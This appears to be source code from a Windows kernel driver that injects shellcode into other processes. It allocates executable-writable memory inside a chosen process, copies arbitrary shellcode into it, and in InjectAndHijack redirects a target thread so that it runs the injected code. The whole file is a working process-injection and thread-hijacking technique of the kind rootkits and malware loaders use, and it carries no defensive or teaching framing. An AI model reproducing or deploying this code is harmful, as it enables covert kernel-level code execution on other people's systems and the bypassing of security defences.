
static NTSTATUS
AllocateAndWriteShellcode(
	_In_  PEPROCESS   Process,
	_In_reads_bytes_(DataSize) PUCHAR ShellcodeData,
	_In_  ULONG       DataSize,
	_Out_ PULONG_PTR  OutAddress
)
{
	if (Process == NULL || ShellcodeData == NULL || DataSize == 0 || OutAddress == NULL)
		return STATUS_INVALID_PARAMETER;

	*OutAddress = 0;

	if (G_pZwAllocateVirtualMemory == NULL)
	{
		UNICODE_STRING Rtn;
		RtlInitUnicodeString(&Rtn, L"ZwAllocateVirtualMemory");
		G_pZwAllocateVirtualMemory = reinterpret_cast<PZwAllocateVirtualMemory_t>(
			MmGetSystemRoutineAddress(&Rtn));
	}

	if (G_pZwAllocateVirtualMemory == NULL)
	{
		LogMessage("ShellcodeInject: ZwAllocateVirtualMemory unavailable.\n");
		return STATUS_NOT_SUPPORTED;
	}

	KAPC_STATE ApcState;
	KeStackAttachProcess(Process, &ApcState);

	SIZE_T AllocSize = DataSize;
	PVOID RemoteAddr = NULL;
	NTSTATUS Status = G_pZwAllocateVirtualMemory(
		ZwCurrentProcess(),
		&RemoteAddr,
		0,
		&AllocSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!NT_SUCCESS(Status))
	{
		KeUnstackDetachProcess(&ApcState);
		LogMessage("ShellcodeInject: memory allocation (PID=%p, size=%u) failed: 0x%08X.\n",
			PsGetProcessId(Process), DataSize, Status);
		return Status;
	}

	__try
	{
		RtlCopyMemory(RemoteAddr, ShellcodeData, DataSize);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Status = GetExceptionCode();
	}

	if (!NT_SUCCESS(Status))
	{
		AllocSize = 0;
		G_pZwAllocateVirtualMemory(ZwCurrentProcess(), &RemoteAddr, 0, &AllocSize,
			MEM_RELEASE, PAGE_NOACCESS);
		KeUnstackDetachProcess(&ApcState);
		LogMessage("ShellcodeInject: RtlCopyMemory to %p failed: 0x%08X.\n",
			RemoteAddr, Status);
		return Status;
	}

	KeUnstackDetachProcess(&ApcState);
	*OutAddress = reinterpret_cast<ULONG_PTR>(RemoteAddr);

	LogMessage("ShellcodeInject: allocated %u bytes RWX at %p in process %p.\n",
		DataSize, RemoteAddr, PsGetProcessId(Process));

	return STATUS_SUCCESS;
}

NTSTATUS
InjectShellcode(
	_In_                          ULONG      ProcessId,
	_In_reads_bytes_(DataSize)    PUCHAR     ShellcodeData,
	_In_                          ULONG      DataSize,
	_Out_                         PULONG_PTR OutAddress
)
{
	if (ProcessId == 0 || ShellcodeData == NULL || DataSize == 0 || OutAddress == NULL)
		return STATUS_INVALID_PARAMETER;

	PEPROCESS Process = NULL;
	NTSTATUS Status = PsLookupProcessByProcessId(ULongToHandle(ProcessId), &Process);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("InjectShellcode: PID %u not found.\n", ProcessId);
		return Status;
	}

	Status = AllocateAndWriteShellcode(Process, ShellcodeData, DataSize, OutAddress);
	ObfDereferenceObject(Process);

	return Status;
}

NTSTATUS
InjectAndHijack(
	_In_                          ULONG      ThreadId,
	_In_reads_bytes_(DataSize)    PUCHAR     ShellcodeData,
	_In_                          ULONG      DataSize,
	_Out_                         PULONG_PTR OutAddress
)
{
	if (ThreadId == 0 || ShellcodeData == NULL || DataSize == 0 || OutAddress == NULL)
		return STATUS_INVALID_PARAMETER;

	*OutAddress = 0;

	PETHREAD Thread = NULL;
	NTSTATUS Status = PsLookupThreadByThreadId(ULongToHandle(ThreadId), &Thread);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("InjectAndHijack: PsLookupThreadByThreadId(TID=%u) failed: 0x%08X.\n",
			ThreadId, Status);
		return Status;
	}

	PEPROCESS Process = IoThreadToProcess(Thread);
	if (Process == NULL)
	{
		LogMessage("InjectAndHijack: IoThreadToProcess returned NULL for TID=%u.\n",
			ThreadId);
		ObfDereferenceObject(Thread);
		return STATUS_INVALID_CID;
	}

	ULONG_PTR ShellcodeAddr = 0;
	Status = AllocateAndWriteShellcode(Process, ShellcodeData, DataSize, &ShellcodeAddr);
	if (!NT_SUCCESS(Status))
	{
		LogMessage("InjectAndHijack: AllocateAndWriteShellcode(TID=%u) failed: 0x%08X.\n",
			ThreadId, Status);
		ObfDereferenceObject(Thread);
		return Status;
	}

	LogMessage("InjectAndHijack: shellcode at %p, hijacking TID=%u.\n",
		reinterpret_cast<PVOID>(ShellcodeAddr), ThreadId);

	Status = HijackThreadContext(ThreadId, ShellcodeAddr);

	if (NT_SUCCESS(Status))
	{
		*OutAddress = ShellcodeAddr;
		LogMessage("InjectAndHijack: TID=%u hijacked to %p successfully.\n",
			ThreadId, reinterpret_cast<PVOID>(ShellcodeAddr));
	}
	else
	{
		LogMessage("InjectAndHijack: HijackThreadContext(TID=%u) failed: 0x%08X, shellcode leaked at %p.\n",
			ThreadId, Status, reinterpret_cast<PVOID>(ShellcodeAddr));
	}

	ObfDereferenceObject(Thread);
	return Status;
}
